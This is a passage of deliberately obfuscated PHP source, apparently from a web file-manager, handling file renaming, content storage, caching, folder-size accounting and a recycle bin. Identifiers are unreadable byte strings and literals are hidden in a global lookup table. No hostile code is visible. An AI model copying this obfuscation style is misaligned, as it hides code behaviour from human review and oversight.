array_unique(array_filter($‡ÔŠ·íõ)); $ä·ı›ÌÇ = array_filter($ä·ı›ÌÇ); if (!$‡ÔŠ·íõ) { return !1; } $ñ€Şäâ™ = array($ªôÀá¹[502] => array($ªôÀá¹[503], $‡ÔŠ·íõ)); Model($ªôÀá¹[2294])->where($ñ€Şäâ™)->delete(); Model($ªôÀá¹[546])->where($ñ€Şäâ™)->delete(); Model($ªôÀá¹[2132])->where($ñ€Şäâ™)->delete(); Model($ªôÀá¹[649])->where($ñ€Şäâ™)->delete(); Model($ªôÀá¹[1957])->removeBySource($‡ÔŠ·íõ); Model($ªôÀá¹[2275])->removeBySource($‡ÔŠ·íõ); $this->where($ñ€Şäâ™)->delete(); Model($ªôÀá¹[557])->remove($ä·ı›ÌÇ); for ($èÉôâ¨½ = 0; $èÉôâ¨½ < count($‡ÔŠ·íõ); $èÉôâ¨½++) { $this->sourceCacheClear($‡ÔŠ·íõ[$èÉôâ¨½]); } } public function rename($ß°ÛæÍô, $©éËºèû) { $ø™¢…íÈ =& $_SERVER[äô®•½Â]; $çëÈ›Ãş = $this->sourceInfo($ß°ÛæÍô); if (!$çëÈ›Ãş) { return !1; } $¢ß†çùÃ = $this->fileNameExist($çëÈ›Ãş[$ø™¢…íÈ[193]], $©éËºèû); if ($¢ß†çùÃ && $¢ß†çùÃ != $ß°ÛæÍô) { return !1; } $÷Ø¼¶¢Ó = array($ø™¢…íÈ[505] => $©éËºèû, $ø™¢…íÈ[667] => USER_ID); if ($çëÈ›Ãş[$ø™¢…íÈ[496]] != $ø™¢…íÈ[91]) { $÷Ø¼¶¢Ó[$ø™¢…íÈ[497]] = substr(get_path_ext($©éËºèû), 0, 10); } Model($ø™¢…íÈ[649])->eventRename($ß°ÛæÍô, $çëÈ›Ãş[$ø™¢…íÈ[32]], $©éËºèû); $this->sourceCacheClear($ß°ÛæÍô); $this->setNamePinyin($ß°ÛæÍô, $÷Ø¼¶¢Ó[$ø™¢…íÈ[32]], !1); $this->updateModifyTime($çëÈ›Ãş[$ø™¢…íÈ[193]]); $Øß¸ô¥® = $this->where(array($ø™¢…íÈ[502] => $ß°ÛæÍô))->data($÷Ø¼¶¢Ó)->save(); $¦€ßæ™Á = $ø™¢…íÈ[2283] . $çëÈ›Ãş[$ø™¢…íÈ[193]]; if (isset(self::$cacheChildList[$¦€ßæ™Á])) { unset(self::$cacheChildList[$¦€ßæ™Á]); } return $Øß¸ô¥®; } public function setNamePinyin($À½¸ªıé, $ö«ü³‘, $ñÌêíÅ = true) { $¿Àğ–ô† =& $_SERVER[äô®•½Â]; $ª÷Ç¯¾ = Input::check($ö«ü³‘, $¿Àğ–ô†[671]); $€ëÙÅ¼ = array($¿Àğ–ô†[528] => KodSort::makeStr($ö«ü³‘)); if ($ª÷Ç¯¾) { $€ëÙÅ¼[$¿Àğ–ô†[549]] = str_replace($¿Àğ–ô†[53], $¿Àğ–ô†[12], Pinyin::get($ö«ü³‘)); $€ëÙÅ¼[$¿Àğ–ô†[548]] = Pinyin::get($ö«ü³‘, $¿Àğ–ô†[672]); } if (!$ñÌêíÅ && !$ª÷Ç¯¾) { $€ëÙÅ¼[$¿Àğ–ô†[549]] = null; $€ëÙÅ¼[$¿Àğ–ô†[548]] = null; } $this->metaSet($À½¸ªıé, $€ëÙÅ¼); } public function getContent($æüúø©¨) { $¶Ò­¤ß£ =& $_SERVER[äô®•½Â]; $ÆŒÏÃ´ = $this->fileInfoGet($æüúø©¨); if (!$ÆŒÏÃ´) { return !1; } if ($ÆŒÏÃ´[$¶Ò­¤ß£[79]] == 0) { return $¶Ò­¤ß£[12]; } $Äšö°š = $¶Ò­¤ß£[2297] . $ÆŒÏÃ´[$¶Ò­¤ß£[560]]; if ($ÆŒÏÃ´[$¶Ò­¤ß£[79]] <= 1024 * 10) { $•š©¥ = Cache::get($Äšö°š); if (!$•š©¥) { $•š©¥ = IO::getContent($ÆŒÏÃ´[$¶Ò­¤ß£[87]]); Cache::set($Äšö°š, $•š©¥); } return $•š©¥; } if (!$ÆŒÏÃ´[$¶Ò­¤ß£[87]]) { return $¶Ò­¤ß£[12]; } return IO::getContent($ÆŒÏÃ´[$¶Ò­¤ß£[87]]); } public function setDesc($»‹ô‚Åğ, $Ø´ŸÑêû) { $‰ª»†×‚ =& $_SERVER[äô®•½Â]; Model($‰ª»†×‚[649])->eventAddDesc($»‹ô‚Åğ, $Ø´ŸÑêû); return $this->metaSet($»‹ô‚Åğ, $‰ª»†×‚[537], $Ø´ŸÑêû); } public function setContent($Ë‰«ñî„, $ Ç‹ç—æ = '') { $¹ù™»Ÿô =& $_SERVER[äô®•½Â]; $†·ïÒÍ = $this->sourceInfo($Ë‰«ñî„); $ğ×ğ³º¡ = $this->fileInfoGet($Ë‰«ñî„); if (!$ğ×ğ³º¡ || !$†·ïÒÍ) { return !1; } $Õ‘¢Ï§ú = KodIO::ioFileDriverGet($¹ù™»Ÿô[494] . $Ë‰«ñî„ . $¹ù™»Ÿô[413]); $™äåı¦Á = Model($¹ù™»Ÿô[557])->addFileByContent($ Ç‹ç—æ, $Õ‘¢Ï§ú, $†·ïÒÍ[$¹ù™»Ÿô[32]]); if (!$™äåı¦Á) { return !1; } $¯æ´ÁÄé = $this->fileHistory($†·ïÒÍ, $™äåı¦Á[$¹ù™»Ÿô[554]], $™äåı¦Á[$¹ù™»Ÿô[79]]); if (!$¯æ´ÁÄé) { return Model($¹ù™»Ÿô[557])->remove($™äåı¦Á[$¹ù™»Ÿô[554]]); } $this->folderSizeReset($†·ïÒÍ[$¹ù™»Ÿô[193]]); return !0; } public function fileSubstr($ñèÃ†²µ, $íÀ«²¾ö, $–á¥“ÌÚ) { $ş¼Êé”˜ = $this->fileInfoGet($ñèÃ†²µ); if (!$ş¼Êé”˜) { return !1; } return IO::fileSubstr($ş¼Êé”˜[$_SERVER[äô®•½Â][87]], $íÀ«²¾ö, $–á¥“ÌÚ); } public function fileInfoGet($ñ™ÁË²) { $Äá›˜¡ã =& $_SERVER[äô®•½Â]; $ì­¹µŠû = $this->sourceInfo($ñ™ÁË²); if (!$ì­¹µŠû || $ì­¹µŠû[$Äá›˜¡ã[496]]) { return !1; } $Æ¶©™Áü = $Äá›˜¡ã[561] . $ì­¹µŠû[$Äá›˜¡ã[554]]; $ãèŠ·¦´ = _get(self::$cacheFileInfo, $Æ¶©™Áü); if ($ãèŠ·¦´) { return $ãèŠ·¦´; } $‚éØµ÷Â = Model($Äá›˜¡ã[557])->fileInfo($ì­¹µŠû[$Äá›˜¡ã[554]]); if ($‚éØµ÷Â) { $‚éØµ÷Â[$Äá›˜¡ã[32]] = $ì­¹µŠû[$Äá›˜¡ã[32]]; } self::$cacheFileInfo[$Æ¶©™Áü] = $‚éØµ÷Â; return $‚éØµ÷Â; } private function folderChildrenNumber($µÈÓ¸û) { $×Ô¹¬ô =& $_SERVER[äô®•½Â]; $ğ»œ‚›Ì = $this->sourceInfo($µÈÓ¸û); $º¨âŒëÈ = array($×Ô¹¬ô[668] => array($×Ô¹¬ô[628], $ğ»œ‚›Ì[$×Ô¹¬ô[597]] . $µÈÓ¸û . $×Ô¹¬ô[629]), $×Ô¹¬ô[665] => $ğ»œ‚›Ì[$×Ô¹¬ô[582]], $×Ô¹¬ô[515] => intval($ğ»œ‚›Ì[$×Ô¹¬ô[516]]), $×Ô¹¬ô[662] => 1); $Ä£ƒ½‹â = $this->where($º¨âŒëÈ)->count(); $ïâÜÈØ‡ = $this->where($º¨âŒëÈ)->where(array($×Ô¹¬ô[662] => 0))->count(); return array($×Ô¹¬ô[83] => $ïâÜÈØ‡, $×Ô¹¬ô[84] => $Ä£ƒ½‹â); } public function pathInfo($œè£í², $²«ã™ˆ = false) { $Îºû‚× =& $_SERVER[äô®•½Â]; $²«ã™ˆ = !1; $œè£í² = intval($œè£í²); $Û®Ó—šŒ = $Îºû‚×[545] . intval($²«ã™ˆ) . $Îºû‚×[473] . $œè£í²; $ÆÛ†¿á´ = _get(self::$cachePathInfo, $Û®Ó—šŒ); if ($ÆÛ†¿á´) { return $ÆÛ†¿á´; } $íŞº‰êç = $this->sourceInfo($œè£í²); if (!$íŞº‰êç) { return !1; } $íŞº‰êç = $this->_listDataApplyItem($íŞº‰êç, $²«ã™ˆ); self::$cachePathInfo[$Û®Ó—šŒ] = $íŞº‰êç; return $íŞº‰êç; } public static $cachePathInfoMore = array(); public function pathInfoMore($˜ŸğáìË) { $õšÇ¹×Å =& $_SERVER[äô®•½Â]; $÷îø¤¢º = _get(self::$cachePathInfoMore, $˜ŸğáìË); if ($÷îø¤¢º) { return $÷îø¤¢º; } $Ó›ŠÓ†  = $this->pathInfo($˜ŸğáìË); if (!$Ó›ŠÓ† ) { return !1; } if ($Ó›ŠÓ† [$õšÇ¹×Å[496]] == $õšÇ¹×Å[91]) { $Ó›ŠÓ† [$õšÇ¹×Å[82]] = $this->folderChildrenNumber($˜ŸğáìË); } self::$cachePathInfoMore[$˜ŸğáìË] = $Ó›ŠÓ† ; return $Ó›ŠÓ† ; } public function sourceInfo($Ş’©‹) { $”¶ßóÓ· =& $_SERVER[äô®•½Â]; if (!$Ş’©‹) { return array(); } $Ş’©‹ = intval($Ş’©‹); $Ìûè‘Á¸ = $”¶ßóÓ·[544] . $Ş’©‹; $†õ „ÓÛ = _get(self::$cacheSourceInfo, $Ìûè‘Á¸); if ($†õ „ÓÛ) { return $†õ „ÓÛ; } $œÙâ· = $this->where(array($”¶ßóÓ·[194] => $Ş’©‹))->find(); self::$cacheSourceInfo[$Ìûè‘Á¸] = $œÙâ·; return self::$cacheSourceInfo[$Ìûè‘Á¸]; } public function sourceCacheClear($­´Ô¾§Š = false) { self::cacheClear($­´Ô¾§Š); } public static function cacheClear($ÂÏê¯Ù = false) { $ˆ¹°ÓµŒ =& $_SERVER[äô®•½Â]; if ($ÂÏê¯Ù == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ˆ¹°ÓµŒ[544] . $ÂÏê¯Ù]); unset(self::$cachePathInfoMore[$ÂÏê¯Ù]); unset(self::$cachePathInfo[$ˆ¹°ÓµŒ[2298] . $ÂÏê¯Ù]); unset(self::$cachePathInfo[$ˆ¹°ÓµŒ[2299] . $ÂÏê¯Ù]); } public function metaSet($×¡Òº—„, $£óòÊ‰¬ = null, $³èšÁè  = null) { $ªãÎ„ˆé = parent::metaSet($×¡Òº—„, $£óòÊ‰¬, $³èšÁè ); if ($ªãÎ„ˆé) { $this->sourceCacheClear($×¡Òº—„); } return $ªãÎ„ˆé; } public function pathInfoByPath($âï¥Œ…È, $“ ¦›£Æ) { $íâÙ‡÷ =& $_SERVER[äô®•½Â]; $ØÑ½‘İš = !$“ ¦›£Æ ? array() : explode($íâÙ‡÷[8], trim($“ ¦›£Æ, $íâÙ‡÷[8])); $¤Ï§ã¤Õ = intval($âï¥Œ…È); foreach ($ØÑ½‘İš as $®¤Ô¶¶™) { $ÊÒ­´ª = array($íâÙ‡÷[193] => $¤Ï§ã¤Õ, $íâÙ‡÷[32] => $®¤Ô¶¶™); $ÒòöºŠ‚ = $this->field($íâÙ‡÷[2300])->where($ÊÒ­´ª)->select(); if (!$ÒòöºŠ‚) { return !1; } $ÒòöºŠ‚ = array_sort_by($ÒòöºŠ‚, $íâÙ‡÷[516]); $¤Ï§ã¤Õ = intval($ÒòöºŠ‚[0][$íâÙ‡÷[194]]); } $­»“ıÜ© = $this->sourceInfo($¤Ï§ã¤Õ); $this->pathInfoFilter($­»“ıÜ©); return $­»“ıÜ©; } protected function updateModifyTime($Ç¾Âö½â) { $è·‘ò¿â =& $_SERVER[äô®•½Â]; $İõ‰Å¿¢ = defined($è·‘ò¿â[2208]) ? USER_ID : 0; if (!$Ç¾Âö½â) { return; } if (!is_array($Ç¾Âö½â)) { $Ç¾Âö½â = array($Ç¾Âö½â); } foreach ($Ç¾Âö½â as $­æÙ‹êÚ => $ƒˆÎ ½õ) { $Ç¾Âö½â[$­æÙ‹êÚ] = intval($ƒˆÎ ½õ); $this->sourceCacheClear($ƒˆÎ ½õ); } $¿šÆ¦éŞ = array($è·‘ò¿â[194] => array($è·‘ò¿â[7], $Ç¾Âö½â)); $ÁûŠ«Åø = array($è·‘ò¿â[667] => $İõ‰Å¿¢, $è·‘ò¿â[509] => time()); $this->where($¿šÆ¦éŞ)->save($ÁûŠ«Åø); } public function folderSizeReset($èâ¢êàÅ, $šÔ¤”Ç¡ = false) { $–¡Á‰€¥ =& $_SERVER[äô®•½Â]; if ($this->statusIgnoreResetSpace) { return; } if (!$èâ¢êàÅ) { return; } $ÚÅçÉâÌ = $this->sourceInfo($èâ¢êàÅ); $¾áĞ¾Ü¾ = $–¡Á‰€¥[2301] . $èâ¢êàÅ; if (!$ÚÅçÉâÌ || !$ÚÅçÉâÌ[$–¡Á‰€¥[194]]) { return; } CacheLock::lock($¾áĞ¾Ü¾, 20); if ($šÔ¤”Ç¡ === !1) { $this->sourceCacheClear($èâ¢êàÅ); $ÚÅçÉâÌ = $this->sourceInfo($èâ¢êàÅ); $¶Ïİ• = array($–¡Á‰€¥[488] => $èâ¢êàÅ, $–¡Á‰€¥[515] => 0); $õ•À¼¹¹ = $this->where($¶Ïİ•)->sum($–¡Á‰€¥[79]); $šÔ¤”Ç¡ = intval($õ•À¼¹¹) - intval($ÚÅçÉâÌ[$–¡Á‰€¥[79]]); } if ($šÔ¤”Ç¡ == 0) { return CacheLock::unlock($¾áĞ¾Ü¾); } $ÆŞã‚£ö = $this->parentLevelArray($ÚÅçÉâÌ[$–¡Á‰€¥[597]]); if (!$ÆŞã‚£ö) { $ÆŞã‚£ö = array(); } $ÆŞã‚£ö[] = $ÚÅçÉâÌ[$–¡Á‰€¥[194]]; $¶Ïİ• = array($–¡Á‰€¥[194] => array($–¡Á‰€¥[503], $ÆŞã‚£ö)); if ($šÔ¤”Ç¡ < 0) { $¶Ïİ•[$–¡Á‰€¥[79]] = array($–¡Á‰€¥[1087], abs($šÔ¤”Ç¡)); } $this->where($¶Ïİ•)->setAdd($–¡Á‰€¥[79], $šÔ¤”Ç¡); CacheLock::unlock($¾áĞ¾Ü¾); if (!$ÚÅçÉâÌ[$–¡Á‰€¥[582]] || $ÚÅçÉâÌ[$–¡Á‰€¥[582]] == $–¡Á‰€¥[231]) { return; } $’Ö¿€ = $–¡Á‰€¥[2302] . $ÚÅçÉâÌ[$–¡Á‰€¥[191]] . $–¡Á‰€¥[4] . $ÚÅçÉâÌ[$–¡Á‰€¥[582]]; $•±Æ­¿º = array($ÚÅçÉâÌ[$–¡Á‰€¥[191]], $ÚÅçÉâÌ[$–¡Á‰€¥[582]]); TaskRun::timeLimitCall($’Ö¿€, $–¡Á‰€¥[2303], $•±Æ­¿º, 1.5); } public function folderSizeResetChildren($´İÜÂÌ) { $¡¥­üøÚ =& $_SERVER[äô®•½Â]; $this->sourceCacheClear($´İÜÂÌ); $ì¸‡ù… = $this->sourceInfo($´İÜÂÌ); if (!$ì¸‡ù…) { return; } $ˆ¦²³§ù = array($¡¥­üøÚ[662] => 1, $¡¥­üøÚ[665] => $ì¸‡ù…[$¡¥­üøÚ[582]], $¡¥­üøÚ[668] => array($¡¥­üøÚ[628], $ì¸‡ù…[$¡¥­üøÚ[597]] . $´İÜÂÌ . $¡¥­üøÚ[629])); $Ç‘“™İ = $¡¥­üøÚ[2304]; $’©çáó = $this->field($Ç‘“™İ)->where($ˆ¦²³§ù)->select(); $ˆ¦²³§ù[$¡¥­üøÚ[496]] = 0; $Ó§Å‚í¼ = $this->field($Ç‘“™İ)->where($ˆ¦²³§ù)->select(); if (!$Ó§Å‚í¼) { return; } $’©çáó[] = $ì¸‡ù…; $’©çáó = array_to_keyvalue($’©çáó, $¡¥­üøÚ[194]); foreach ($’©çáó as $€Ğ“şÊ† => $ÑÃğüãú) { $’©çáó[$€Ğ“şÊ†][$¡¥­üøÚ[2305]] = $’©çáó[$€Ğ“şÊ†][$¡¥­üøÚ[79]]; $’©çáó[$€Ğ“şÊ†][$¡¥­üøÚ[79]] = 0; } foreach ($Ó§Å‚í¼ as $ÑÃğüãú) { $¥±ßá£Ù = $ÑÃğüãú[$¡¥­üøÚ[193]] . $¡¥­üøÚ[12]; if (!isset($’©çáó[$¥±ßá£Ù])) { continue; } if ($ÑÃğüãú[$¡¥­üøÚ[516]] == $’©çáó[$¥±ßá£Ù][$¡¥­üøÚ[516]]) { $’©çáó[$¥±ßá£Ù][$¡¥­üøÚ[79]] += $ÑÃğüãú[$¡¥­üøÚ[79]]; } } foreach ($’©çáó as $ÑÃğüãú) { $½÷ÍÑÖ = $this->parentLevelArray($ÑÃğüãú[$¡¥­üøÚ[597]]); foreach ($½÷ÍÑÖ as $¥±ßá£Ù) { $¥±ßá£Ù = $¥±ßá£Ù . $¡¥­üøÚ[12]; if (!isset($’©çáó[$¥±ßá£Ù])) { continue; } if ($ÑÃğüãú[$¡¥­üøÚ[516]] == $’©çáó[$¥±ßá£Ù][$¡¥­üøÚ[516]]) { $’©çáó[$¥±ßá£Ù][$¡¥­üøÚ[79]] += $ÑÃğüãú[$¡¥­üøÚ[79]]; } } } $¶×£Í‰ã = array(); foreach ($’©çáó as $ÑÃğüãú) { if ($ÑÃğüãú[$¡¥­üøÚ[79]] == $ÑÃğüãú[$¡¥­üøÚ[2305]]) { continue; } $¶×£Í‰ã[] = array($¡¥­üøÚ[194], $ÑÃğüãú[$¡¥­üøÚ[194]], $¡¥­üøÚ[79], $ÑÃğüãú[$¡¥­üøÚ[79]]); } $this->saveAll($¶×£Í‰ã); } public function userSpaceReset($ì©¿¶ÙÂ = false) { $ªÏöÇÏ¸ =& $_SERVER[äô®•½Â]; $§›àîóÆ = $this->where(array($ªÏöÇÏ¸[191] => self::TYPE_USER, $ªÏöÇÏ¸[582] => $ì©¿¶ÙÂ, $ªÏöÇÏ¸[496] => 0))->sum($ªÏöÇÏ¸[79]); $§›àîóÆ = !$§›àîóÆ || $§›àîóÆ <= 0 ? 0 : $§›àîóÆ; Model($ªÏöÇÏ¸[590])->userEdit($ì©¿¶ÙÂ, array($ªÏöÇÏ¸[1966] => $§›àîóÆ)); } public function targetSpaceUpdate($ªñæ‘Ìì, $ÜŒ—ùÂ£) { $­¸îÅù =& $_SERVER[äô®•½Â]; if (!$ÜŒ—ùÂ£) { return; } if (!in_array($ªñæ‘Ìì, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Á¦Â²¥ö = $this->targetSpaceSize($ªñæ‘Ìì, $ÜŒ—ùÂ£); if ($ªñæ‘Ìì == self::TYPE_USER) { Model($­¸îÅù[590])->userEdit($ÜŒ—ùÂ£, array($­¸îÅù[1966] => $Á¦Â²¥ö)); } else { if ($ªñæ‘Ìì == self::TYPE_GROUP) { Model($­¸îÅù[598])->groupEdit($ÜŒ—ùÂ£, array($­¸îÅù[1966] => $Á¦Â²¥ö)); } } } public function targetSpaceSize($¤ñ—µ, $“æ”¶Íç) { $íæÇø¯ã =& $_SERVER[äô®•½Â]; $”ëï™Íô = 0; $¾«•¦‡Ì = $this->targetSourceRoot($¤ñ—µ, $“æ”¶Íç, !0); foreach ($¾«•¦‡Ì as $¼ì“â„‚) { if (!$¼ì“â„‚) { continue; } $”ëï™Íô += floatval($¼ì“â„‚[$íæÇø¯ã[79]]); $¦­ÂÜÆ¤ = array($íæÇø¯ã[668] => array($íæÇø¯ã[628], $íæÇø¯ã[606] . $¼ì“â„‚[$íæÇø¯ã[194]] . $íæÇø¯ã[629])); $Š²çÍú‘ = Model($íæÇø¯ã[514])->field($íæÇø¯ã[502])->where($¦­ÂÜÆ¤)->select(); $Š²çÍú‘ = array_to_keyvalue($Š²çÍú‘, $íæÇø¯ã[12], $íæÇø¯ã[194]); $Š²çÍú‘ = array_unique(array_filter($Š²çÍú‘)); if ($Š²çÍú‘) { $¦­ÂÜÆ¤ = array($íæÇø¯ã[502] => array($íæÇø¯ã[503], $Š²çÍú‘)); $”ëï™Íô += floatval($this->where($¦­ÂÜÆ¤)->sum($íæÇø¯ã[79])); } } $”ëï™Íô = !$”ëï™Íô || $”ëï™Íô <= 0 ? 0 : $”ëï™Íô; return $”ëï™Íô; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($îÊ¡¤Éò) { return $this->fileTypeProfile($îÊ¡¤Éò, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ØºñßÓ) { return $this->fileTypeProfile($ØºñßÓ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($é±ê“, $•ŸéªĞ°) { $‡ÈÙéÏÖ =& $_SERVER[äô®•½Â]; $èª¼ µ´ = $‡ÈÙéÏÖ[2306] . $é±ê“ . $‡ÈÙéÏÖ[11] . $•ŸéªĞ°; $…­ÁÊ—ì = Cache::get($èª¼ µ´); if ($…­ÁÊ—ì) { return $…­ÁÊ—ì; } $ïÑ«„€ó = array($‡ÈÙéÏÖ[662] => 0); if ($é±ê“ != !1) { $ïÑ«„€ó[$‡ÈÙéÏÖ[582]] = $é±ê“; $ïÑ«„€ó[$‡ÈÙéÏÖ[191]] = $•ŸéªĞ°; } $çÜÃÁ‹İ = array(); $çÜÃÁ‹İ[$‡ÈÙéÏÖ[2307]] = array($‡ÈÙéÏÖ[2308] => LNG($‡ÈÙéÏÖ[2307]), $‡ÈÙéÏÖ[2309] => $this->where($ïÑ«„€ó)->count(), $‡ÈÙéÏÖ[633] => $this->where($ïÑ«„€ó)->sum($‡ÈÙéÏÖ[79])); $òê‡Íöû = KodIO::fileTypeList(); foreach ($òê‡Íöû as $õºœÛƒ => $óáƒë²¶) { $ïÑ«„€ó[$‡ÈÙéÏÖ[497]] = $this->fileTypeWhere($õºœÛƒ); $çÜÃÁ‹İ[$õºœÛƒ] = array($‡ÈÙéÏÖ[2308] => $óáƒë²¶[$‡ÈÙéÏÖ[32]], $‡ÈÙéÏÖ[2309] => $this->where($ïÑ«„€ó)->count(), $‡ÈÙéÏÖ[633] => $this->where($ïÑ«„€ó)->sum($‡ÈÙéÏÖ[79])); } Cache::set($èª¼ µ´, $çÜÃÁ‹İ, 1200); return $çÜÃÁ‹İ; } public function fileNameExist($²İîùµ›, $œ†ÓİĞ») { $¨¯§Üò× =& $_SERVER[äô®•½Â]; $ğ—³âı‚ = $this->field($¨¯§Üò×[2310])->where(array($¨¯§Üò×[193] => $²İîùµ›, $¨¯§Üò×[32] => $œ†ÓİĞ», $¨¯§Üò×[516] => 0))->find(); return is_array($ğ—³âı‚) ? $ğ—³âı‚[$¨¯§Üò×[194]] : !1; } public function childList($ëéİÎÌˆ) { $‚‘»šñ =& $_SERVER[äô®•½Â]; $°Ô…˜ş = $‚‘»šñ[2283] . $ëéİÎÌˆ; if (isset(self::$cacheChildList[$°Ô…˜ş])) { return self::$cacheChildList[$°Ô…˜ş]; } $áØ¥ˆÀŸ = array($‚‘»šñ[193] => intval($ëéİÎÌˆ), $‚‘»šñ[516] => 0); $‰£·Œµ± = $this->where($áØ¥ˆÀŸ)->select(); $‰£·Œµ± = $‰£·Œµ± ? $‰£·Œµ± : array(); self::$cacheChildList[$°Ô…˜ş] = $‰£·Œµ±; foreach ($‰£·Œµ± as $§íšóµ) { $°Ô…˜ş = $‚‘»šñ[544] . $§íšóµ[$‚‘»šñ[194]]; self::$cacheSourceInfo[$°Ô…˜ş] = $§íšóµ; } return $‰£·Œµ±; } public function fileNameAuto($ô¦í­…¼, $¬¼‰¨—, $öª€ëéø = REPEAT_RENAME, $èíüı÷§ = false) { $Æœ»œ¹ =& $_SERVER[äô®•½Â]; $õøü³ „ = get_path_ext($¬¼‰¨—); $ğğêƒäù = $õøü³ „ ? get_path_ext_name($¬¼‰¨—) . $Æœ»œ¹[2311] . $õøü³ „ : $¬¼‰¨— . $Æœ»œ¹[471]; $ÈÕş°¥ = array($Æœ»œ¹[193] => $ô¦í­…¼, $Æœ»œ¹[516] => 0, $Æœ»œ¹[32] => array($Æœ»œ¹[470], $ğğêƒäù)); $Ã«€øº = $this->field($Æœ»œ¹[32])->where($ÈÕş°¥)->select(); $ó³¶Œî• = array_to_keyvalue($Ã«€øº, $Æœ»œ¹[12], $Æœ»œ¹[32]); return $this->fileNameAutoGet($ó³¶Œî•, $¬¼‰¨—, $öª€ëéø, $èíüı÷§); } public function fileNameAutoGet($ŞÓ†ÓÁè, $£¬•ïÈ», $ºÚº«¬¡, $†‰Á¸ô³) { $‹È´°¥œ =& $_SERVER[äô®•½Â]; if ($ºÚº«¬¡ == REPEAT_REPLACE || !$ŞÓ†ÓÁè || !in_array_not_case($£¬•ïÈ», $ŞÓ†ÓÁè) || $†‰Á¸ô³ && $ºÚº«¬¡ != REPEAT_RENAME_FOLDER) { return $£¬•ïÈ»; } if ($ºÚº«¬¡ == REPEAT_SKIP) { return !1; } $ŒŒËÊµ = $‹È´°¥œ[10] . get_path_ext($£¬•ïÈ»); $ŒŒËÊµ = $ŒŒËÊµ == $‹È´°¥œ[10] || $†‰Á¸ô³ ? $‹È´°¥œ[12] : $ŒŒËÊµ; for ($è´âÇ­× = 1; $è´âÇ­× <= count($ŞÓ†ÓÁè) + 1; $è´âÇ­×++) { $šşì“Ñ¶ = substr($£¬•ïÈ», 0, strlen($£¬•ïÈ») - strlen($ŒŒËÊµ)); $ú¬àºõË = $šşì“Ñ¶ . "\x28{$è´âÇ­×}\51{$ŒŒËÊµ}"; if (!in_array_not_case($ú¬àºõË, $ŞÓ†ÓÁè)) { return $ú¬àºõË; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\x63\x65\137\162\x65\143\x79\143\154\145"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\x54\x69\155\x65", "\164\151\x6d\145", "\x69\156\x73\x65\162\x74", "\x66\165\x6e\143\x74\151\157\156")); public function listData($•éµ½Û¢ = false) { $Ü¦‘ÓÈ =& $_SERVER[äô®•½Â]; $•éµ½Û¢ = $•éµ½Û¢ ? $•éµ½Û¢ : USER_ID; $¼Ò çÍÓ = $this->where(array($Ü¦‘ÓÈ[1768] => $•éµ½Û¢))->select(); return array_to_keyvalue($¼Ò çÍÓ, $Ü¦‘ÓÈ[12], $Ü¦‘ÓÈ[194]); } public function moveToRecycle($Ö£Ùâ€¬) { $‰†’Ë–Ù =& $_SERVER[äô®•½Â]; $şïå÷áõ = Model($‰†’Ë–Ù[1426]); $ª¨®æ = $şïå÷áõ->sourceInfo($Ö£Ùâ€¬); if (!$ª¨®æ || $ª¨®æ[$‰†’Ë–Ù[516]] == $‰†’Ë–Ù[91]) { return; } $£ÊŸÖŒ = array($‰†’Ë–Ù[502] => $Ö£Ùâ€¬, $‰†’Ë–Ù[1768] => USER_ID, $‰†’Ë–Ù[664] => $ª¨®æ[$‰†’Ë–Ù[191]], $‰†’Ë–Ù[665] => $ª¨®æ[$‰†’Ë–Ù[582]], $‰†’Ë–Ù[668] => $ª¨®æ[$‰†’Ë–Ù[597]]); $this->add($£ÊŸÖŒ); $this->recycleMove($Ö£Ùâ€¬, 1); if ($ª¨®æ[$‰†’Ë–Ù[496]] == $‰†’Ë–Ù[91]) { $ÎîÒ™‰ = array($‰†’Ë–Ù[668] => array($‰†’Ë–Ù[628], $ª¨®æ[$‰†’Ë–Ù[597]] . $Ö£Ùâ€¬ . $‰†’Ë–Ù[629])); $şïå÷áõ->where($ÎîÒ™‰)->setField($‰†’Ë–Ù[516], 1); } } public function clear() { $this->remove(!1); } public function remove($è¸¸ø¾ = false, $µ»öÂˆõ = false) { $‡¤Áàã =& $_SERVER[äô®•½Â]; $µ»öÂˆõ = $µ»öÂˆõ ? $µ»öÂˆõ : USER_ID; $¥‘ÌÙäé = Model($‡¤Áàã[1426]); $²ÊûƒØ = $this->listData($µ»öÂˆõ); $è¸¸ø¾ = $è¸¸ø¾ === !1 ? !1 : $è¸¸ø¾; $˜ÚşÕû€ = array(); foreach ($²ÊûƒØ as $…¸º¥òÙ) { if ($è¸¸ø¾ != !1 && !in_array($…¸º¥òÙ, $è¸¸ø¾)) { continue; } $óçíµ· = $¥‘ÌÙäé->sourceInfo($…¸º¥òÙ); $¥‘ÌÙäé->remove($…¸º¥òÙ, !1); $šÌ é¬ = $óçíµ·[$‡¤Áàã[191]] . $‡¤Áàã[11] . $óçíµ·[$‡¤Áàã[582]]; $˜ÚşÕû€[$šÌ é¬] = array($‡¤Áàã[664] => $óçíµ·[$‡¤Áàã[191]], $‡¤Áàã[582] => $óçíµ·[$‡¤Áàã[582]]); $this->where(array($‡¤Áàã[194] => $…¸º¥òÙ))->delete(); } foreach ($˜ÚşÕû€ as $§¬ØÈÁ™) { $¥‘ÌÙäé->targetSpaceUpdate($§¬ØÈÁ™[$‡¤Áàã[191]], $§¬ØÈÁ™[$‡¤Áàã[582]]); } } public function restore($ñÕ½¤ = false) { $ç‰ãµî¨ = $this->listData(); $this->_restoreSource($ç‰ãµî¨, $ñÕ½¤); } public function removeUserAll($Şåä·º©) { $this->remove(!1, $Şåä·º©); } public function restoreItem($¸­®®ˆ) { $this->_restoreSource(array($¸­®®ˆ), array($¸­®®ˆ)); } private function _restoreSource($Âøí¬Šš, $ûçˆãÖä) { $¨Øş¯¶ =& $_SERVER[äô®•½Â]; $Ó–ÒíÖÚ = Model($¨Øş¯¶[1426]); $ûçˆãÖä = $ûçˆãÖä == !1 ? !1 : $ûçˆãÖä; if (!$Âøí¬Šš) { return !0; } $§ƒÜµé¤ = array(); foreach ($Âøí¬Šš as $’Ëß›˜ß) { if ($ûçˆãÖä != !1 && !in_array($’Ëß›˜ß, $ûçˆãÖä)) 